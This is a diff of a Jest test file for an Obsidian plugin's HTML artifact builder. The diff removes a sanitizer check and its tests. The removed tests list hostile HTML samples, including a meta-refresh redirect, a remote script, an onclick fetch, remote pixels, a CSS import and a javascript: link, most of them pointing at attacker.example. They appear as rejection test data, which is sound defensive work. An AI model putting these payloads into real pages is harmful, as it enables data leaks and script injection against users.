@@ -1,10 +1,8 @@
 import {
   buildOpenArtifactsDocument,
   createOpenArtifactsDocument,
-  createOpenArtifactsReviewDocument,
   OPENARTIFACTS_MAX_HTML_BYTES,
   OpenArtifactsDocumentTooLargeError,
-  OpenArtifactsDocumentUnsafeError,
 } from "@/openArtifacts/openArtifactsDocument";
 import { App, Component, MarkdownRenderer, TFile } from "obsidian";
 
@@ -90,22 +88,6 @@ describe("openArtifactsDocument", () => {
     });
   });
 
-  describe("OpenArtifactsDocumentUnsafeError", () => {
-    describe("constructor()", () => {
-      it("describes active or remote content as invalid finished HTML", () => {
-        const error = new OpenArtifactsDocumentUnsafeError([
-          "remove unsupported <script>",
-          'embed or remove "src" on <img>',
-        ]);
-
-        expect(error).toBeInstanceOf(Error);
-        expect(error.message).toBe(
-          'OpenArtifacts HTML is not publishable: remove unsupported <script>; embed or remove "src" on <img>.'
-        );
-      });
-    });
-  });
-
   describe("createOpenArtifactsDocument()", () => {
     it("freezes the exact HTML string and its UTF-8 byte length", () => {
       const html = "<!doctype html><html><body>Résumé</body></html>\n";
@@ -125,51 +107,6 @@ describe("openArtifactsDocument", () => {
 
       expect(() => createOpenArtifactsDocument("Too large", html)).toThrow(
         OpenArtifactsDocumentTooLargeError
-      );
-    });
-  });
-
-  describe("createOpenArtifactsReviewDocument()", () => {
-    it("returns exact immutable passive HTML with embedded styling and assets", () => {
-      const html =
-        '<!doctype html><html><head><style>:root{--ink:#123}@media (prefers-color-scheme:dark){:root{--ink:#eee}}circle{fill:var(--ink);filter:url("#shadow")}</style></head><body><a href="https://example.com">Source</a><img src="data:image/png;base64,iVBORw0KGgo="><svg><defs><filter id="shadow"></filter><linearGradient id="paint"></linearGradient></defs><circle cx="1" cy="1" r="1" fill="url(#paint)"></circle></svg></body></html>';
-
-      const result = createOpenArtifactsReviewDocument("Review", html);
-
-      expect(result.html).toBe(html);
-      expect(Object.isFrozen(result)).toBe(true);
-    });
-
-    it.each([
-      [
-        "automatic redirects",
-        '<meta content="0;url=https://attacker.example/leak" HTTP-EQUIV=" Refresh ">',
-      ],
-      ["active elements", '<script src="https://attacker.example/run.js"></script>'],
-      ["event handlers", "<p onclick=\"fetch('https://attacker.example/')\">Review</p>"],
-      ["remote assets", '<img src="https://attacker.example/note.png">'],
-      ["executable links", '<a href="javascript:alert(1)">Review</a>'],
-      ["CSS resource URLs", "<style>body{background:url(https://attacker.example/pixel)}</style>"],
-      ["CSS imports", '<style>@import "//attacker.example/style.css";</style>'],
-      [
-        "SVG resource URLs",
-        '<svg><use href="https://attacker.example/icons.svg#note"></use></svg>',
-      ],
-      ["nested HTML documents", '<iframe srcdoc="<p>Hidden</p>"></iframe>'],
-    ])("rejects %s before review", (_case, body) => {
-      const html = `<!doctype html><html><body>${body}</body></html>`;
-
-      expect(() => createOpenArtifactsReviewDocument("Unsafe", html)).toThrow(
-        OpenArtifactsDocumentUnsafeError
-      );
-    });
-
-    it("reports every actionable violation in one failure", () => {
-      const html =
-        '<!doctype html><script></script><img src="https://attacker.example/pixel"><p onclick="alert(1)">Review</p>';
-
-      expect(() => createOpenArtifactsReviewDocument("Unsafe", html)).toThrow(
-        'remove unsupported <script>; embed or remove "src" on <img>; remove "onclick" from <p>'
       );
     });
   });
